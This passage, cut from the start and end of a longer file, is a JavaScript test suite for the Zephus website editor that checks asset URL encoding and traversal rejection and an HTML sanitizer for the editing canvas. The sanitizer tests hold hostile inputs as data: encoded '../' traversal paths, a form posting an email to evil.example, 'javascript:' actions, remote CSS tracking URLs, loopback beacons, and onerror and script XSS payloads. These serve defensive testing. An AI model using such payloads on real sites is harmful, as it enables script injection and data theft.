        rm(tmp);
      }
    }
  }

  // 16b. Asset filenames with URL delimiters keep their on-disk names while
  // web paths are segment-encoded; encoded traversal stays rejected.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("asset URLs encode #, %, and spaces", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const assetsSvc = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assets.js"),
          ).href
        );
        const assetUsage = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assetUsage.js"),
          ).href
        );
        const reusable = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "reusableSections.js"),
          ).href
        );
        const png1x1 = Buffer.from(
          "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
          "base64",
        );
        const diskName = "hero #100%.png";
        const encoded = "/assets/images/hero%20%23100%25.png";
        const srcImg = path.join(tmp, diskName);
        fs.writeFileSync(srcImg, png1x1);
        const imported = assetsSvc.importAssetsFromPaths(project, "public", [
          srcImg,
        ]);
        const webPath = imported.imported?.[0]?.webPath;
        const legacySpelling = "/assets/images/hero #100%.png";
        const readLegacyDoc = svc.schema.readPageDocument(
          project,
          "index.astro",
          "src/pages",
        );
        const seededDoc = readLegacyDoc.pageDocument
          ? svc.schema.writePageDocument(project, "src/pages", {
              ...readLegacyDoc.pageDocument,
              socialImage: legacySpelling,
              sections: [
                {
                  id: "sec-legacy-alias",
                  type: "section",
                  label: `${encoded} Band`,
                  props: { wrapper: "none", cls: encoded },
                  style: { background: `url(${legacySpelling})` },
                  children: [
                    {
                      id: "h-legacy-alias",
                      type: "heading",
                      props: {
                        text: `See ${legacySpelling} and ${encoded}`,
                        level: "2",
                        cls: legacySpelling,
                      },
                    },
                    {
                      id: "img-legacy-alias",
                      type: "image",
                      props: {
                        src: legacySpelling,
                        alt: "Legacy",
                        cls: legacySpelling,
                      },
                      style: { background: `url(${legacySpelling})` },
                    },
                    {
                      id: "raw-legacy-alias",
                      type: "html",
                      props: {},
                      raw: `<img src="${legacySpelling}" alt="A" /><img src="${legacySpelling}" alt="B" />`,
                    },
                  ],
                },
              ],
            })
          : { ok: false };
        const seededReusable = reusable.saveReusableSection(
          project,
          "Legacy Alias Banner",
          `<img src="${legacySpelling}" alt="A" /><img src="${legacySpelling}" alt="B" />`,
        );
        const legacySite = svc.schema.readSiteDocument(project);
        const seededSite = legacySite.site
          ? svc.schema.writeSiteDocument(
              project,
              {
                ...legacySite.site,
                faviconPath: legacySpelling,
                shell: {
                  ...legacySite.site.shell,
                  footerHtml: `<img src="${legacySpelling}" alt="Footer" />`,
                  customHeadHtml: `<link rel="preload" href="${legacySpelling}" />`,
                },
              },
              "src/pages",
            )
          : { ok: false };
        const legacyUsage = assetUsage.findAssetUsage(
          project,
          "src/pages",
          encoded,
        );
        const legacyUsageCount = Number(legacyUsage.pages?.[0]?.count ?? 0);
        const legacyUsageOk =
          seededDoc.ok === true &&
          seededReusable.ok === true &&
          seededSite.ok === true &&
          legacyUsage.ok === true &&
          legacyUsage.pages?.length === 1 &&
          legacyUsageCount === 8 &&
          ["Site favicon", "Footer HTML", "Custom head HTML"].every((place) =>
            legacyUsage.siteReferences?.includes(place),
          ) &&
          legacyUsage.siteReferences?.some((place) =>
            place.includes("Legacy Alias Banner"),
          );
        const rawFile = path.join(
          project,
          "public",
          "assets",
          "images",
          diskName,
        );
        const hashedUrl = webPath
          ? new URL(webPath, "https://zephus.test/")
          : null;
        const listed = assetsSvc.listProjectAssets(project, "public");
        const listedEntry = listed.assets?.find(
          (a) => a.fileName === `images/${diskName}`,
        );
        const rawExists = fs.existsSync(rawFile);
        const read = webPath
          ? assetsSvc.readAssetDataUrl(project, "public", webPath)
          : { ok: false };
        const renamed = webPath
          ? assetsSvc.renameAsset(project, "public", webPath, "hero #2%")
          : { ok: false };
        const legacyRepoint = renamed.ok
          ? assetUsage.repointAssetReferences(
              project,
              "src/pages",
              webPath,
              renamed.webPath,
            )
          : { ok: false, updated: 0 };
        const renamedFile = path.join(
          project,
          "public",
          "assets",
          "images",
          "hero #2%.png",
        );
        const renamedUrl = renamed.webPath
          ? new URL(renamed.webPath, "https://zephus.test/")
          : null;
        const legacyRenamedRead = assetsSvc.readAssetDataUrl(
          project,
          "public",
          "/assets/images/hero #2%.png",
        );
        const literalPercentName = "legacy%20percent.png";
        const literalPercentSrc = path.join(tmp, literalPercentName);
        fs.writeFileSync(literalPercentSrc, png1x1);
        const literalImported = assetsSvc.importAssetsFromPaths(
          project,
          "public",
          [literalPercentSrc],
        );
        const literalEncoded = literalImported.imported?.[0]?.webPath;
        const literalDecodedName = path.join(
          project,
          "public",
          "assets",
          "images",
          "legacy percent.png",
        );
        const legacyLiteralRead = assetsSvc.readAssetDataUrl(
          project,
          "public",
          "/assets/images/legacy%20percent.png",
        );
        const encodedLiteralRead = assetsSvc.readAssetDataUrl(
          project,
          "public",
          literalEncoded,
        );
        const afterLegacyDoc = svc.schema.readPageDocument(
          project,
          "index.astro",
          "src/pages",
        ).pageDocument;
        const afterLegacySec = afterLegacyDoc?.sections?.[0];
        const [afterLegacyH, afterLegacyImg, afterLegacyRaw] =
          afterLegacySec?.children ?? [];
        const afterLegacySite = svc.schema.readSiteDocument(project).site;
        const afterLegacyReusable = reusable.listReusableSections(project);
        const newEncoded = renamed.webPath;
        const structuralLegacyIntact =
          afterLegacySec?.props?.cls === encoded &&
          afterLegacyH?.props?.cls === legacySpelling;
        const legacyContent = JSON.stringify({
          sectionProps: Object.fromEntries(
            Object.entries(afterLegacySec?.props ?? {}).filter(
              ([key]) => key !== "cls",
            ),
          ),
          sectionStyle: afterLegacySec?.style,
          blocks: (afterLegacySec?.children ?? []).map((block) => ({
            props: Object.fromEntries(
              Object.entries(block.props ?? {}).filter(
                ([key]) => key !== "cls",
              ),
            ),
            style: block.style,
            raw: block.raw,
          })),
          socialImage: afterLegacyDoc?.socialImage,
          favicon: afterLegacySite?.faviconPath,
          footer: afterLegacySite?.shell?.footerHtml,
          head: afterLegacySite?.shell?.customHeadHtml,
          reusable: afterLegacyReusable.sections?.map((s) => s.html),
        });
        const legacyContentClean =
          !legacyContent.includes(legacySpelling) &&
          !legacyContent.includes(encoded);
        const legacyAliasOk =
          legacyUsageOk &&
          legacyRepoint.ok === true &&
          legacyRepoint.updated === 13 &&
          structuralLegacyIntact &&
          afterLegacyH?.props?.text === `See ${newEncoded} and ${newEncoded}` &&
          afterLegacyImg?.props?.src === newEncoded &&
          afterLegacyImg?.style?.background === `url(${newEncoded})` &&
          afterLegacySec?.style?.background === `url(${newEncoded})` &&
          String(afterLegacyRaw?.raw ?? "").split(newEncoded).length - 1 ===
            2 &&
          afterLegacyDoc?.socialImage === newEncoded &&
          afterLegacySite?.faviconPath === newEncoded &&
          String(afterLegacySite?.shell?.footerHtml ?? "").includes(
            newEncoded,
          ) &&
          String(afterLegacySite?.shell?.customHeadHtml ?? "").includes(
            newEncoded,
          ) &&
          String(afterLegacyReusable.sections?.[0]?.html ?? "").includes(
            newEncoded,
          ) &&
          legacyContentClean;
        record(
          "asset legacy raw aliases find & repoint",
          legacyAliasOk,
          `usage=${legacyUsageCount} sites=${legacyUsage.siteReferences?.length} repointed=${legacyRepoint.updated} structural=${structuralLegacyIntact} clean=${legacyContentClean}`,
        );
        const roundTripOk =
          imported.ok === true &&
          webPath === encoded &&
          hashedUrl !== null &&
          hashedUrl.hash === "" &&
          hashedUrl.search === "" &&
          rawExists &&
          listedEntry?.webPath === encoded &&
          read.ok === true &&
          String(read.dataUrl).startsWith("data:image/png;base64,") &&
          renamed.ok === true &&
          renamed.webPath === "/assets/images/hero%20%232%25.png" &&
          fs.existsSync(renamedFile) &&
          renamedUrl !== null &&
          renamedUrl.hash === "" &&
          legacyRenamedRead.ok === true &&
          literalImported.ok === true &&
          literalEncoded === "/assets/images/legacy%2520percent.png" &&
          !fs.existsSync(literalDecodedName) &&
          legacyLiteralRead.ok === true &&
          encodedLiteralRead.ok === true;
        record(
          "asset URLs encode #, %, and spaces",
          roundTripOk,
          `webPath=${webPath} listed=${listedEntry?.webPath} renamed=${renamed.webPath} legacy=${legacyRenamedRead.ok} literal=${legacyLiteralRead.ok}/${literalEncoded}`,
        );

        const keep = path.join(project, "keep.png");
        fs.writeFileSync(keep, "outside public");
        const traversalWebPath = "/assets/images/%2e%2e/%2e%2e/%2e%2e/keep.png";
        const deleted = assetsSvc.deleteAsset(
          project,
          "public",
          traversalWebPath,
        );
        const readTraversal = assetsSvc.readAssetDataUrl(
          project,
          "public",
          traversalWebPath,
        );
        const encodedSlash = assetsSvc.renameAsset(
          project,
          "public",
          "/assets%2Fimages%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fkeep.png",
          "escaped",
        );
        const helperThrows = (value) => {
          try {
            assetsSvc.assetReferenceSpellings(value);
            return false;
          } catch {
            return true;
          }
        };
        const aliasTraversalThrew = helperThrows(traversalWebPath);
        const aliasSlashThrew = helperThrows(
          "/assets%2Fimages%2F%2e%2e%2F%2e%2e%2Fkeep.png",
        );
        record(
          "asset encoded traversal rejected",
          deleted.ok === false &&
            readTraversal.ok === false &&
            encodedSlash.ok === false &&
            aliasTraversalThrew &&
            aliasSlashThrew &&
            fs.existsSync(keep),
          `delete=${deleted.error ?? "allowed"} read=${readTraversal.error ?? "allowed"} rename=${encodedSlash.error ?? "allowed"} aliases=${aliasTraversalThrew}/${aliasSlashThrew}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 17. editorIcons resolves kebab-case data-lucide names and engine registers all used icons.
  {
    const iconsSrc = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "editorIcons.ts"),
      "utf8",
    );
    const engineSrc = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
      "utf8",
    );
    const requiredKeys = [
      "ArrowDown",
      "ArrowUp",
      "Blocks",
      "BookOpen",
      "Copy",
      "CreditCard",
      "Edit3",
      "Ellipsis",
      "Files",
      "GripVertical",
      "Images",
      "Layers3",
      "LoaderCircle",
      "LockKeyhole",
      "Minus",
      "MoveVertical",
      "PanelTopOpen",
      "Pencil",
      "RemoveFormatting",
      "Rocket",
      "Search",
      "SlidersHorizontal",
      "Terminal",
      "Trash2",
      "Unlink",
      "Video",
    ];
    const hasPascalHelper =
      iconsSrc.includes("toPascalCase") && engineSrc.includes("Edit3");
    const missing = requiredKeys.filter((k) => !engineSrc.includes(k));
    record(
      "editorIcons resolves kebab-case data-lucide icons",
      hasPascalHelper && missing.length === 0,
      missing.length === 0
        ? `hasPascal=${hasPascalHelper}`
        : `missing: ${missing.join(", ")}`,
    );
  }

  // 18. splash.html & styles.css promote root chrome tokens and Studio dark palette.
  {
    const splashHtml = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "splash.html"),
      "utf8",
    );
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const rootBlockMatch = stylesCss.match(/:root\s*\{[\s\S]*?\}/);
    const lightBlockMatch = stylesCss.match(
      /\[data-theme="light"\]\s*\{[\s\S]*?\}/,
    );
    const hasRootChrome =
      !!rootBlockMatch?.[0].includes("--chrome-0") &&
      !!rootBlockMatch?.[0].includes("--chrome-border") &&
      !!lightBlockMatch?.[0].includes("--chrome-0");
    const hasSplashStudio =
      splashHtml.includes("#090a0f") &&
      splashHtml.includes("zephus-mark") &&
      splashHtml.includes("#6366f1");
    record(
      "splash.html and styles.css root chrome tokens",
      hasRootChrome && hasSplashStudio,
      `rootChrome=${hasRootChrome} splashStudio=${hasSplashStudio}`,
    );
    const canvasRule = stylesCss.match(/\.canvas\s*\{[^}]*\}/);
    record(
      "canvas paint containment keeps fixed overlays inside",
      !!canvasRule && /contain:\s*paint/.test(canvasRule[0]),
      canvasRule ? "canvas rule found" : "canvas rule missing",
    );
    const previewRule = stylesCss.match(/\.block-preview\s*\{[^}]*\}/);
    record(
      "block preview contains fixed overlays",
      !!previewRule && /contain:\s*paint/.test(previewRule[0]),
      previewRule ? "block preview rule found" : "block preview rule missing",
    );
  }

  {
    let guard;
    try {
      guard = compileRendererHelper("src/renderer/canvasLinks.ts");
    } catch (e) {
      record("canvas links do not navigate the editor", false, e.message);
      guard = null;
    }
    if (guard) {
      const doc = dom.window.document;
      const root = doc.createElement("div");
      const link = doc.createElement("a");
      link.href = "/about";
      const label = doc.createElement("span");
      label.textContent = "About";
      link.appendChild(label);
      const button = doc.createElement("button");
      button.type = "button";
      button.textContent = "Insert";
      root.append(link, button);
      doc.body.appendChild(root);
      guard.installCanvasLinkGuard(root);
      const fire = (type, target, buttonId) => {
        const event = new dom.window.MouseEvent(type, {
          bubbles: true,
          cancelable: true,
          button: buttonId,
        });
        target.dispatchEvent(event);
        return event.defaultPrevented;
      };
      const linkClick = fire("click", label, 0);
      const middleClick = fire("auxclick", link, 1);
      const middleDown = fire("mousedown", link, 1);
      const buttonClick = fire("click", button, 0);
      record(
        "canvas links do not navigate the editor",
        linkClick && middleClick && middleDown && !buttonClick,
        `click=${linkClick} aux=${middleClick} down=${middleDown} button=${buttonClick}`,
      );
      const later = doc.createElement("a");
      later.href = "/later";
      later.textContent = "Later";
      root.appendChild(later);
      guard.installCanvasLinkGuard(root);
      record(
        "canvas links stay out of the tab order",
        link.tabIndex === -1 && later.tabIndex === -1 && button.tabIndex === 0,
        `link=${link.tabIndex} later=${later.tabIndex} button=${button.tabIndex}`,
      );
      const svgNs = "http://www.w3.org/2000/svg";
      const xlinkNs = "http://www.w3.org/1999/xlink";
      const svg = doc.createElementNS(svgNs, "svg");
      const anchor = doc.createElementNS(svgNs, "a");
      anchor.setAttributeNS(
        xlinkNs,
        "xlink:href",
        "http://127.0.0.1:9/svg-xlink-nav",
      );
      const text = doc.createElementNS(svgNs, "text");
      text.textContent = "SVG xlink";
      anchor.appendChild(text);
      svg.appendChild(anchor);
      root.appendChild(svg);
      const xlinkClick = new dom.window.MouseEvent("click", {
        bubbles: true,
        cancelable: true,
        button: 0,
      });
      text.dispatchEvent(xlinkClick);
      record(
        "canvas svg xlink does not navigate the editor",
        xlinkClick.defaultPrevented &&
          !anchor.matches("a[href]") &&
          anchor.matches("a[*|href]") &&
          anchor.getAttributeNS(xlinkNs, "href") ===
            "http://127.0.0.1:9/svg-xlink-nav",
        `prevented=${xlinkClick.defaultPrevented} href=${anchor.matches("a[href]")} any=${anchor.matches("a[*|href]")}`,
      );
      root.remove();
    }
  }

  {
    const rust = fs.readFileSync(
      path.join(ROOT, "src-tauri", "src", "window.rs"),
      "utf8",
    );
    const script = rust.match(
      /const WEBVIEW_GUARD_SCRIPT: &str = r#"([\s\S]*?)"#;/,
    )?.[1];
    if (!script) {
      record(
        "webview guard blocks browser save and view source",
        false,
        "guard script missing",
      );
    } else {
      const guardDom = new JSDOM("<!doctype html><html><body></body></html>");
      const sandbox = {
        window: guardDom.window,
        document: guardDom.window.document,
        Element: guardDom.window.Element,
      };
      vm.runInNewContext(script, sandbox, { timeout: 1000 });
      const fire = (key, mods) => {
        const event = new guardDom.window.KeyboardEvent("keydown", {
          key,
          bubbles: true,
          cancelable: true,
          ctrlKey: !!mods.ctrl,
          metaKey: !!mods.meta,
          altKey: !!mods.alt,
        });
        guardDom.window.dispatchEvent(event);
        return event.defaultPrevented;
      };
      const saveBlocked = fire("s", { ctrl: true });
      const macSaveBlocked = fire("s", { meta: true });
      const sourceBlocked = fire("u", { ctrl: true });
      const openBlocked = fire("o", { ctrl: true });
      const findKept = !fire("f", { ctrl: true });
      const typedKept = !fire("s", {});
      const altSaveKept = !fire("s", { ctrl: true, alt: true });
      record(
        "webview guard blocks browser save and view source",
        saveBlocked &&
          macSaveBlocked &&
          sourceBlocked &&
          openBlocked &&
          findKept &&
          typedKept &&
          altSaveKept,
        `save=${saveBlocked} mac=${macSaveBlocked} source=${sourceBlocked} open=${openBlocked} find=${findKept} typed=${typedKept} alt=${altSaveKept}`,
      );
    }
  }

  {
    const raw =
      '<div id="modal-overlay" autofocus class="hero">Panel</div>' +
      '<label for="btn-settings">Open</label>' +
      '<button commandfor="btn-help" form="git-panel">Go</button>' +
      '<button popovertarget="modal-overlay">Pop</button>' +
      '<a interestfor="modal-overlay" href="/about">About</a>' +
      '<button interesttarget="btn-help">Hint</button>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-e2e", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const canvasClean =
      !/\sid\s*=/i.test(canvas) &&
      !/\sfor\s*=/i.test(canvas) &&
      !/autofocus/i.test(canvas) &&
      !/commandfor/i.test(canvas) &&
      !/popovertarget/i.test(canvas) &&
      !/interestfor/i.test(canvas) &&
      !/interesttarget/i.test(canvas) &&
      !/\sform\s*=/i.test(canvas) &&
      canvas.includes("Panel") &&
      canvas.includes("Open") &&
      canvas.includes("Go") &&
      canvas.includes("Pop") &&
      canvas.includes("About") &&
      canvas.includes("Hint") &&
      canvas.includes('class="hero"');
    record(
      "canvas html cannot capture editor ids",
      canvasClean &&
        published.includes('id="modal-overlay"') &&
        published.includes('for="btn-settings"') &&
        published.includes('popovertarget="modal-overlay"') &&
        published.includes('interestfor="modal-overlay"') &&
        published.includes('interesttarget="btn-help"'),
      canvas,
    );
  }

  {
    const raw = '<div contenteditable="true">Edit me</div>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-ce", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    record(
      "canvas html cannot become an editor field",
      !/contenteditable/i.test(canvas) &&
        canvas.includes("Edit me") &&
        /contenteditable/i.test(published),
      canvas,
    );
  }

  {
    const raw =
      "<p>Body copy</p>" +
      '<input type="text" value="Ada">' +
      "<textarea>Note</textarea>" +
      "<select><option>A</option></select>" +
      '<button type="button">Go</button>' +
      '<a href="/about">About</a>' +
      "<dialog open>Notice</dialog>";
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-controls", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const host = dom.window.document.createElement("div");
    host.innerHTML = canvas;
    const frozen = [
      "input",
      "textarea",
      "select",
      "button",
      "a",
      "dialog",
    ].every((tag) => host.querySelector(tag)?.hasAttribute("inert") === true);
    const readable =
      host.textContent.includes("Body copy") &&
      host.textContent.includes("Note") &&
      host.textContent.includes("About") &&
      host.textContent.includes("Notice") &&
      host.querySelector("input")?.getAttribute("value") === "Ada";
    host.remove();
    record(
      "canvas html controls stay out of the editor",
      frozen &&
        readable &&
        published.includes('value="Ada"') &&
        published.includes("<textarea>Note</textarea>") &&
        !/\sinert\b/i.test(published),
      canvas,
    );
  }

  {
    const raw =
      '<form action="https://evil.example/collect" method="post">' +
      "<p>Join the list</p>" +
      '<label>Email <input type="email" value="ada@example.com"></label>' +
      '<button type="submit" formaction="javascript:alert(1)">Join</button>' +
      "</form>";
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-form", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const host = dom.window.document.createElement("div");
    host.innerHTML = canvas;
    const input = host.querySelector("input");
    const button = host.querySelector("button");
    const kept =
      host.querySelector("form") === null &&
      host.textContent.includes("Join the list") &&
      host.textContent.includes("Email") &&
      input?.getAttribute("value") === "ada@example.com" &&
      input.hasAttribute("inert") &&
      button?.textContent === "Join" &&
      button.hasAttribute("inert") &&
      !canvas.includes("formaction") &&
      !canvas.includes("javascript:") &&
      !canvas.includes("evil.example");
    host.remove();
    record(
      "canvas html form keeps its contents",
      kept &&
        published.includes("<form") &&
        published.includes("Join the list") &&
        published.includes("https://evil.example/collect"),
      canvas,
    );
  }

  {
    const raw =
      '<button tabindex="5">First</button>' +
      '<a href="/about" tabindex="0">Link</a>' +
      '<span tabindex="-1" accesskey="s">Skip</span>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-tab", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    record(
      "canvas html cannot steal the tab order",
      !/tabindex="5"/i.test(canvas) &&
        !/accesskey/i.test(canvas) &&
        /tabindex="0"/i.test(canvas) &&
        /tabindex="-1"/i.test(canvas) &&
        canvas.includes("First") &&
        published.includes('tabindex="5"') &&
        /accesskey/i.test(published),
      canvas,
    );
  }

  {
    const raw =
      '<div role="dialog" aria-modal="true">Notice</div>' +
      '<button role="button">OK</button>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-modal", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    record(
      "canvas html cannot mark the editor inert",
      !/aria-modal/i.test(canvas) &&
        /role="dialog"/i.test(canvas) &&
        /role="button"/i.test(canvas) &&
        canvas.includes("Notice") &&
        published.includes('aria-modal="true"'),
      canvas,
    );
  }

  {
    const raw =
      "<div style=\"color:#123456;background:url(https://evil.example/pixel);background:image-set('https://evil.example/set.png' 1x);background:\\75 rl(https://evil.example/escape.png)\">Hi</div>";
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-style", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    record(
      "canvas html style drops remote fetch",
      !canvas.toLowerCase().includes("url(") &&
        !canvas.toLowerCase().includes("image-set") &&
        !canvas.includes("evil.example") &&
        canvas.includes("#123456") &&
        canvas.includes("Hi") &&
        published.toLowerCase().includes("url(") &&
        published.toLowerCase().includes("image-set") &&
        published.includes("\\75 rl(") &&
        published.includes("evil.example"),
      canvas,
    );
  }

  {
    const painted = compileRendererHelper("src/renderer/canvasStyle.ts");
    const sectionPaint = painted.sectionVisualStyle({
      background: "url(https://evil.example/pixel)",
      color: "#123456",
      padding: "12px 16px",
      align: "center",
      shadow: "sm",
    });
    const escapedPaint = painted.sectionVisualStyle({
      background: "\\75 rl(https://evil.example/escape.png)",
    });
    const imageSetPaint = painted.sectionVisualStyle({
      background: 'image-set("https://evil.example/set.png" 1x)',
    });
    const keptPaint = painted.sectionVisualStyle({
      background: "linear-gradient(#111, #222)",
      align: "right",
    });
    const box = painted.boxStyle({
      width: "100px;background:url(https://evil.example/pixel)",
      maxWidth: "800px",
    });
    const paintValues = [
      ...Object.values(sectionPaint),
      ...Object.values(escapedPaint),
      ...Object.values(imageSetPaint),
      ...Object.values(box),
    ].join(" ");
    const view = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "CanvasView.tsx"),
      "utf8",
    );
    record(
      "canvas section paint drops remote background fetch",
      !paintValues.toLowerCase().includes("url(") &&
        !paintValues.toLowerCase().includes("image-set") &&
        !paintValues.includes("evil.example") &&
        sectionPaint.color === "#123456" &&
        sectionPaint.padding === "12px 16px" &&
        sectionPaint["text-align"] === "center" &&
        sectionPaint["box-shadow"] === "var(--shadow-sm)" &&
        !("background" in sectionPaint) &&
        keptPaint.background === "linear-gradient(#111, #222)" &&
        keptPaint["text-align"] === "right" &&
        box["max-width"] === "min(800px, 100%)" &&
        !("width" in box) &&
        view.includes('from "./canvasStyle"') &&
        view.includes("sectionVisualStyle(props.entry.effectiveStyle)"),
      `section=${JSON.stringify(sectionPaint)} escaped=${JSON.stringify(escapedPaint)} set=${JSON.stringify(imageSetPaint)} box=${JSON.stringify(box)}`,
    );
  }

  {
    const raw =
      '<img src="/favicon.ico" attributionsrc="http://127.0.0.1:9222/register" alt="mark">' +
      '<a href="/about" ping="http://127.0.0.1:9222/ping">About</a>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-beacon", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const canvasLower = canvas.toLowerCase();
    record(
      "canvas html does not beacon to loopback",
      !canvasLower.includes("attributionsrc") &&
        !canvasLower.includes("ping=") &&
        !canvas.includes("127.0.0.1") &&
        canvas.includes('data-asset-src="/favicon.ico"') &&
        canvas.includes(`src="${blockRender.CANVAS_ASSET_PLACEHOLDER_SRC}"`) &&
        !/(^|[^a-z-])src=["']\/favicon\.ico/i.test(canvas) &&
        canvas.includes('href="/about"') &&
        canvas.includes("About") &&
        published.toLowerCase().includes("attributionsrc") &&
        published.toLowerCase().includes("ping=") &&
        published.includes("127.0.0.1:9222"),
      canvas,
    );
  }

  {
    const raw =
      '<img src="https://example.com/photo.jpg" alt="Remote">' +
      '<img src="http://127.0.0.1:9/x.png" alt="Loop">' +
      '<img src="/assets/../secret.png" alt="Dot">' +
      '<img srcset="https://example.com/a.png 1x" alt="Set">' +
      '<video src="https://example.com/clip.mp4"></video>' +
      '<svg><image href="http://127.0.0.1:9/a.svg"></image>' +
      '<use href="/favicon.ico"></use>' +
      '<use href="#icon"></use>' +
      '<feImage href="http://127.0.0.1:9/a.png"></feImage></svg>' +
      '<img src="/assets/images/local.png" alt="Local">';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-media", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const notes = canvas.match(/Image loads in the site preview\./g) ?? [];
    record(
      "canvas html media does not fetch the editor or the network",
      notes.length >= 4 &&
        canvas.includes("Video plays in the site preview.") &&
        !/<video\b/i.test(canvas) &&
        !/src=["']https:\/\/example\.com/i.test(canvas) &&
        !/src=["']http:\/\/127\.0\.0\.1/i.test(canvas) &&
        !/href=["']http:\/\/127\.0\.0\.1/i.test(canvas) &&
        !/href=["']\/favicon\.ico/i.test(canvas) &&
        canvas.includes('href="#icon"') &&
        !/srcset=/i.test(canvas) &&
        !canvas.includes("/assets/../secret.png") &&
        canvas.includes('data-asset-src="/assets/images/local.png"') &&
        canvas.includes(`src="${blockRender.CANVAS_ASSET_PLACEHOLDER_SRC}"`) &&
        published.includes('src="https://example.com/photo.jpg"') &&
        published.includes('src="https://example.com/clip.mp4"') &&
        published.includes('href="/favicon.ico"') &&
        published.includes('src="/assets/images/local.png"'),
      canvas,
    );
  }

  {
    const raw =
      '<svg><rect fill="url(#shade)" stroke="url( #shade )" filter="url(\'#shade\')" />' +
      '<rect fill="red" stroke="url(/self-stroke)" filter="url(http://127.0.0.1:9/filter)" ' +
      'clip-path="url(/self-clip)" mask="url(/self-mask)" cursor="url(/self-cursor), auto" ' +
      'marker-start="url(/self-marker)" marker-end="url(\\2f escaped)" /></svg>';
    const canvas = editorBlockRender.sanitizeHtmlForCanvas(raw);
    const published = editorBlockRender.blockToHtmlForEditor(
      { id: "raw-paint", type: "html", raw, props: {} },
      {
        viewport: "desktop",
        forCanvas: false,
        canvasMaxHeadingLevel: 6,
      },
    );
    const canvasLower = canvas.toLowerCase();
    record(
      "canvas svg paint urls stay inside the document",
      canvas.includes('fill="url(#shade)"') &&
        canvas.includes("url( #shade )") &&
        canvas.includes("url('#shade')") &&
        canvas.includes('fill="red"') &&
        !canvasLower.includes("/self-") &&
        !canvasLower.includes("127.0.0.1") &&
        !canvasLower.includes("escaped") &&
        !canvasLower.includes("clip-path") &&
        !canvasLower.includes("marker-") &&
        published.includes('stroke="url(/self-stroke)"') &&
        published.includes("127.0.0.1") &&
        published.includes("url(\\2f escaped)"),
      canvas,
    );
  }

  // 19. Clipboard HTML must not be parsed in the editor document. A detached
  // element there still loads images, so onerror would run before the text
  // is inserted. Style and script source must not be typed into the field.
  {
    let commands;
    try {
      commands = compileRendererHelper("src/renderer/editorCommands.ts");
    } catch (e) {
      record(
        "clipboard html stays outside the editor document",
        false,
        e.message,
      );
    }
    if (commands) {
      const live = dom.window.document;
      const desc = Object.getOwnPropertyDescriptor(
        dom.window.Element.prototype,
        "innerHTML",
      );
      const liveParses = [];
      if (!desc || !desc.set || !desc.get) {
        record(
          "clipboard html stays outside the editor document",
          false,
          "innerHTML descriptor unavailable",
        );
      } else {
        Object.defineProperty(dom.window.Element.prototype, "innerHTML", {
          configurable: true,
          enumerable: desc.enumerable,
          get() {
            return desc.get.call(this);
          },
          set(value) {
            if (this.ownerDocument === live && /onerror/i.test(String(value))) {
              liveParses.push(String(value));
            }
            desc.set.call(this, value);
          },
        });
        const impl = live.implementation;
        const originalCreate = impl.createHTMLDocument.bind(impl);
        let created = 0;
        impl.createHTMLDocument = function createHTMLDocument(title) {
          created += 1;
          return originalCreate(title);
        };
        const inserted = [];
        live.execCommand = (_command, _ui, value) => {
          inserted.push(value);
          return true;
        };
        const markup =
          '<img src="x" onerror="alert(1)"><style>p{color:red}</style><script>alert(1)</script><p>one<br>two</p>';
        try {
          commands.handlePlainTextPaste({
            preventDefault() {},
            clipboardData: {
              getData: (kind) =>
                kind === "text/plain" ? "<img onerror=alert(1)>" : markup,
            },
          });
          commands.handlePlainTextPaste({
            preventDefault() {},
